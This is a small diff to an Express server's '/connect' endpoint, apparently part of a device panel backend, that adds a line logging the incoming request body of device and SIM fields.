@@ -51,6 +51,7 @@ app.get('/', (_, res) => res.send('✅ Panel online'));
 
 // Device connect
 app.post('/connect', (req, res) => {
+  console.log('Received connect request body:', req.body);
   const { uuid, model, battery, sim1, sim2 } = req.body;
   if (!uuid) return res.status(400).send('missing uuid');
 
